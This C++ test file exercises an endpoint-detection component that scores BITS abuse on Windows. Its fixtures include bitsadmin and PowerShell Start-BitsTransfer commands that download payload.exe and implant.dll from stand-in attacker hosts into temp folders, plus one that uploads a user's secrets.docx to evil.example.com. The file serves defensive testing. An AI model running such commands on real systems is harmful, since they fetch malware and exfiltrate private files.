#include "bits_abuse_detector_tests.h"

#include <cstdint>
#include <stdexcept>
#include <string>

#include "bits_abuse_detector.h"
#include "edr_event.h"
#include "event_bus.h"

namespace {

#define BA_CHECK(cond) Check((cond), #cond, __LINE__)

void Check(bool cond, const char* expr, int line) {
    if (!cond) {
        throw std::runtime_error(
            "bits abuse detector test failed at line " +
            std::to_string(line) + ": " + expr);
    }
}

edr::Event ProcessStart(const std::string& image, const std::string& command,
                        uint32_t pid, uint64_t ts100ns) {
    edr::Event ev;
    ev.type = EDR_EVT_PROCESS_START;
    ev.pid = pid;
    ev.ts100ns = ts100ns;
    ev.fields[edr::field::kType] = "PROCESS_START";
    ev.fields[edr::field::kImage] = image;
    ev.fields[edr::field::kCommandLine] = command;
    return ev;
}

edr::Event FileCreate(const std::string& path, const std::string& image,
                      uint32_t pid, uint64_t ts100ns,
                      const char* action = "added") {
    edr::Event ev;
    ev.type = EDR_EVT_FILE_CREATE;
    ev.pid = pid;
    ev.ts100ns = ts100ns;
    ev.fields[edr::field::kType] = "FILE_CREATE";
    ev.fields[edr::field::kFilePath] = path;
    ev.fields[edr::field::kImage] = image;
    ev.fields[edr::field::kFileAction] = action;
    return ev;
}

std::string Field(const edr::Event& ev, const char* name) {
    auto found = ev.fields.find(name);
    return found == ev.fields.end() ? std::string() : found->second;
}

/* Full T1197 delivery chain: bitsadmin downloads a remote EXE into a
 * transient directory. Tool(25) + download(20) + remote(15) + exec(25)
 * + complete-chain bonus(10) = 95 -> MALICIOUS. */
void TestFullBitsDownloadChain() {
    edr::BitsAbuseDetector detector(true, 300, 1024);
    edr::Event ev = ProcessStart(
        "C:\\Windows\\System32\\bitsadmin.exe",
        "bitsadmin.exe /transfer job1 /download /priority high "
        "http://evil.example.com/payload.exe "
        "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe",
        7001, 1000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseVerdict) == "MALICIOUS");
    BA_CHECK(Field(ev, edr::field::kBitsAbuseScore) == "95");
    const std::string signals = Field(ev, edr::field::kBitsAbuseSignals);
    BA_CHECK(signals.find("bits_tool") != std::string::npos);
    BA_CHECK(signals.find("download_job") != std::string::npos);
    BA_CHECK(signals.find("remote_url") != std::string::npos);
    BA_CHECK(signals.find("exec_target") != std::string::npos);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseUrls)
                 .find("http://evil.example.com/payload.exe") !=
             std::string::npos);
}

/* PowerShell Start-BitsTransfer variant. Tool(25) + download(20) +
 * remote(15) + transient target(25) + bonus(10) = 95 -> MALICIOUS. */
void TestPowerShellStartBitsTransfer() {
    edr::BitsAbuseDetector detector(true, 300, 1024);
    edr::Event ev = ProcessStart(
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell.exe -Command Start-BitsTransfer -Source "
        "https://cdn.example.invalid/implant.dll -Destination "
        "C:\\ProgramData\\implant.dll",
        7002, 2000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseVerdict) == "MALICIOUS");
    BA_CHECK(Field(ev, edr::field::kBitsAbuseSignals)
                 .find("bits_tool") != std::string::npos);
}

/* Upload job (exfiltration direction). Tool(25) + upload(20) +
 * remote(15) = 60 -> SUSPICIOUS. */
void TestBitsUploadExfil() {
    edr::BitsAbuseDetector detector(true, 300, 1024);
    edr::Event ev = ProcessStart(
        "bitsadmin",
        "bitsadmin /transfer exfil /upload http://evil.example.com/upload "
        "C:\\Users\\bob\\documents\\secrets.docx",
        7003, 3000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseVerdict) == "SUSPICIOUS");
    BA_CHECK(Field(ev, edr::field::kBitsAbuseSignals)
                 .find("upload_job") != std::string::npos);
}

/* Benign process must not be scored. */
void TestBenignProcessNotScored() {
    edr::BitsAbuseDetector detector(true, 300, 1024);
    edr::Event ev = ProcessStart(
        "C:\\Windows\\System32\\notepad.exe", "notepad.exe notes.txt",
        7004, 4000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseScore).empty());
    BA_CHECK(Field(ev, edr::field::kBitsAbuseVerdict).empty());
}

/* File create attributed to bitsadmin counts as exec target. */
void TestBitsFileCreateExecTarget() {
    edr::BitsAbuseDetector detector(true, 300, 1024);
    edr::Event ev = FileCreate(
        "C:\\Windows\\Tasks\\dropper.exe", "C:\\Windows\\System32\\bitsadmin.exe",
        7005, 5000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseSignals)
                 .find("exec_target") != std::string::npos);
}

/* Disabled detector never enriches. */
void TestDisabledDetector() {
    edr::BitsAbuseDetector detector(false, 300, 1024);
    edr::Event ev = ProcessStart(
        "bitsadmin", "bitsadmin /transfer j /download "
                     "http://evil.example.com/a.exe C:\\Temp\\a.exe",
        7006, 6000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(Field(ev, edr::field::kBitsAbuseScore).empty());
}

/* Window expiry: state drops after the correlation window elapses. */
void TestWindowExpiry() {
    edr::BitsAbuseDetector detector(true, 30, 1024);
    edr::Event ev = ProcessStart(
        "bitsadmin",
        "bitsadmin /transfer j /download http://evil.example.com/a.exe "
        "C:\\Temp\\a.exe",
        7007, 7000000000ULL);
    detector.Enrich(ev);
    BA_CHECK(detector.StateCount() == 1);
    edr::Event later;
    later.type = EDR_EVT_PROCESS_START;
    later.pid = 7099;
    later.ts100ns = 7000000000ULL + 31ULL * 10000000ULL;
    later.fields[edr::field::kType] = "PROCESS_START";
    later.fields[edr::field::kImage] = "C:\\Windows\\System32\\notepad.exe";
    detector.Enrich(later);
    /* Expired state was purged; only the new (benign) process remains. */
    BA_CHECK(detector.StateCount() == 1);
    BA_CHECK(Field(later, edr::field::kBitsAbuseScore).empty());
}

} // namespace

void RunBitsAbuseDetectorTests() {
    TestFullBitsDownloadChain();
    TestPowerShellStartBitsTransfer();
    TestBitsUploadExfil();
    TestBenignProcessNotScored();
    TestBitsFileCreateExecTarget();
    TestDisabledDetector();
    TestWindowExpiry();
}
